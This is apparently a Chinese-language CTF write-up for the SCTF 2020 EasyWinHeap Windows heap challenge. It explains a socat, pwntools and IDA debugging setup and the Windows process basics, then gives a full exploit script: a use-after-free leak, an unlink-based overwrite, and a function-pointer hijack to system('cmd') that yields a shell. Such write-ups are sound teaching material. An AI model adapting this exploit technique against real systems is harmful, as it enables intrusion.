---
title: SCTF 2020 EasyWinHeap 入门 Windows Pwn
date: 2020-07-09 00:00:00
categories:
- CTF/Pwn
tags: 
---

> 本文是写给只会Linux PWN，而对Windows Pwn一窍不通的朋友，对照Linux Pwn的工具、原理、方法，讲解Windows下对应的内容。通过本文可以了解到：1.一种在Win下搭建Pwn题环境的方法（socat+pwntools+IDA） 2. Windows用户态程序运行的基本原理与win下一些实用工具 3.Windows堆管理的基本方法。本题的漏洞点是存在悬空指针可以UAF，而且对于该悬空指针可以继续show、edit、free。利用方式为通过UAFleak堆地址，然后通过unlink完成堆上的节点索引的改写进而继续leak出程序基址，进而继续改写堆上的索引节点leak出ucrt的基址，最后继续修改索引节点的函数指针为system并控制参数为cmd即可getshell。

- 题目附件：[sctf_EasyWinHeap.zip](https://xuanxuanblingbling.github.io/assets/attachment/sctf_EasyWinHeap.zip)
- 运行环境：`Win7 sp1`虚拟机，因为没有用win10，也就没有win10的terminal，所以还是采用[cmder](https://cmder.net/)为本地的终端工具。

## 环境搭建

不同于[winpwn: pwntools for Windows (mini)](https://github.com/byzero512/winpwn)，这里仍然采用pwntools来完成解题，pwntools是不支持本地直接启动windows进程的，所以本地采用socat直接架起来程序，相当于远程环境。

- [socat for windows](https://sourceforge.net/projects/unix-utils/files/socat/1.7.3.2/)
- [socat 1.7.3.2 for Windows](https://www.cybercircuits.co.nz/web/blog/socat-1-7-3-2-for-windows)
- [socat在Windows下的使用](https://juejin.im/post/5d8dd1b16fb9a04e1135dec5)

首先将socat目录添加到环境变量中，然后进入题目文件夹下使用如下命令启动socat，但是当有新的连接进来时总报错说找不到文件，然后我一急眼把题目文件夹也添加进环境变量就好了，不知道是什么原因。

```c
socat tcp-listen:8888,fork EXEC:EasyWinHeap.exe,pipes &
```

启动socat成功后，当有新的连接连入时，则会启动一个新的EasyWinHeap进程，使用IDA本地attach上该进程即可开始调试。另外如果使用pwntools脚本解题，可以在remote连接之后添加raw_input，这时脚本不会继续发送数据，而socat已经完成进程的启动，所以在此时IDA附加到进程上即不会错过断点。如下：

```python
from pwn import *
context.log_level = 'debug'
io = remote("10.10.10.137",8888)

sla         = lambda delim,data           :  (io.sendlineafter(delim, data))
add         = lambda size           	  :  (sla("option >\r\n", '1'),sla("size >\r\n", str(size)))

raw_input()
add(1)
io.interactive()
```

使用如上脚本与socat建立连接，则会启动一个EasyWinHeap进程。在IDA中给add函数下断，然后attach到EasyWinHeap进程，attach后IDA默认会断下，单击继续执行或按下F9，此时程序继续运行。然后在脚本运行处任意给一个输入，执行过raw_input，继续执行add(1)，此时IDA即可捕获到断点，则可以愉快的进行调试了。

使用socat+pwntools+IDA的优点：

1. pwntools环境无需更改
2. IDA动态源码级别调试

使用socat+pwntools+IDA的缺点：

1. 如_HEAP结构体无法直接解析查看
2. 调试断点与调试器的启动无法写在脚本中

当然如果使用socat启动进程也可以使用任何其他调试器来完成调试，但其实IDA的动态调试功能是被大大低估的。使用winpwn的优缺点与以上相反。

## 程序运行原理

进程是操作系统管理的，如果想要了解进行的进行的相关信息，肯定需要操作系统提供接口并且同意给用户查看。

在linux中我们可以通过其提供的proc伪文件系统来查看进程的相关信息，proc伪文件系统也是用户和操作系统内核交互的一个途径，即用户态程序和内核交互的方法并不只有系统调用。比如我们可以查看`/proc/pid/maps`来查看进程的内存布局，一般的pwn题中，除了题目本身的二进制，映射到进程内存的文件一般还有两个：`libc.so，ld.so`

那么在windows里没有proc伪文件系统，我们怎么知道进程的相关信息呢？那就只能通过WindowsAPI了，不会用不要紧，有现成的工具，知道他们的基本原理就好。以下两个Windows官方工具：

- [Process Explorer](https://docs.microsoft.com/zh-cn/sysinternals/downloads/process-explorer)：提供更详细的进程信息的管理工具
- [VMMap](https://docs.microsoft.com/zh-cn/sysinternals/downloads/vmmap)：可以查看程序的内存布局

> 另外[winpwn](https://github.com/byzero512/winpwn)里提供了一个命令行的vmmap工具，感觉不是很好用，一打印好几篇...

有了这两个工具我们就可以自己动手认识一下windows的进程了！我们写一个最简单的程序，在windows上使用gcc编译（首先要安装[MinGW](http://www.mingw.org/)）：

```c
# include <stdio.h>
int main(){
	int a;
	scanf("%d",&a);
}
```
然后双击打开编译好的二进制可执行程序，然后使用使用`Process Explorer`和`VMMap`工具观察:

![image](https://xuanxuanblingbling.github.io/assets/pic/win/test.png)

通过`Process Explorer`可以看到`test.exe`的父进程是`explorer.exe`即文件管理器，因为我们是在目录下双击打开的。在`VMMap`中看到信息就比较多了：

1. 堆空间是多个且分散的
2. 加载了5个动态链接库
3. 程序没有开ASLR

## exp

```python
from pwn import *
#context.log_level = 'debug'
ip = "10.10.10.137";port = 8888
io = remote(ip,port)

sla         = lambda delim,data           :  (io.sendlineafter(delim, data))
add         = lambda size           	  :  (sla("option >\r\n", '1'),sla("size >\r\n", str(size)))
show        = lambda index                :  (sla("option >\r\n", '3'),sla("index >\r\n", str(index)))
edit        = lambda index,data           :  (sla("option >\r\n", '4'),sla("index >\r\n", str(index)),sla("content  >\r\n", data))
free        = lambda index                :  (sla("option >\r\n", '2'),sla("index >\r\n", str(index)))
uu32        = lambda data                 :  u32(data.ljust(4, b'\0'))

# UAF to leak heap
while(1):
    add(32);add(32);add(32)                                         # free block0 or block1, the fd is point to the largest free chunk, it can success leak the heap_base
    free(1);show(1)                                                 # can't free block2 to leak heap_base, because it will merge to the largest free chunk. 
    heap_base = uu32(io.recvuntil("\r\n", drop=True)[:4])-0x630     # and the fd will point to heap_base+0x00c4, it contains NULL byte.
    if heap_base > 0x1000000 :                                      # if the heap_base less than 4 byte, the next step to leak image_base can't success
        break                                                       # because when we leak image_base, before the image_base is the heap_addr 
    io.close();io = remote(ip,port)

log.warn("heap_base:" + hex(heap_base))
list_addr = heap_base + 0x578
block0    = list_addr
block1    = list_addr + 8

# use unlink to make a loop and leak image_base
edit(1,p32(block1)+p32(block1+4))                                   # *(block1 + 4) = block1 + 4 , when show block1, it can leak data in list
add(32);show(1);                                                    # add(32) or free(0) both can trigger unlink
io.recv(4)                                                          # 4 byte heap_addr,if it's only 3 byte, it will be stop to print due to NULL byte
image_base = uu32(io.recvuntil("\r\n", drop=True)[:4])-0x1043
log.warn("image_base:" + hex(image_base))

# use loop to leak ucrt
puts_iat = image_base + 0x20c4
edit(1, p32(puts_iat)+p32(0)+p32(block0));show(1)                   # modify block2content point to block0
ucrt_base = u32(io.recv(4))-0xb89f0
log.warn("ucrt_base:" + hex(ucrt_base))
system = ucrt_base+0xefda0

# modify func pointer to system and tigger it
edit(0, 'cmd\x00')                                                  # normal write, add "cmd" to block0content
edit(2, p32(system)+p32(heap_base+0x600))                           # modify block0 func to system and repair block0content
show(0)                                                             # trigger system(cmd)
io.interactive()
```

## 参考

- [SCTF 2020 PWN](https://sh1ner.github.io/2020/07/07/SCTF-2020-PWN/)
- [Windows-pwn解题原理&利用手法详解](https://www.anquanke.com/post/id/188170#h3-8)
- [Windows Pwn 入门](https://ble55ing.github.io/2019/08/18/WindowsPwn1/)
- [Windows下32位进程内存模型](http://www.xumenger.com/01-windows-process-memory-20170101/)
- [SUCTF 2019 PWN](https://kirin-say.top/2019/08/19/SUCTF-2019-PWN/)
- [CTF中Windows下Pwn题的部署？](https://www.zhihu.com/question/286944913)
- [Windows pwn 的一些感悟](http://blog.eonew.cn/archives/1245)
- [xman 2017 Day 7:Windows pwn](https://www.xctf.org.cn/library/details/9d1cd32600eb05d13abe05bea120fc4c8b286019/)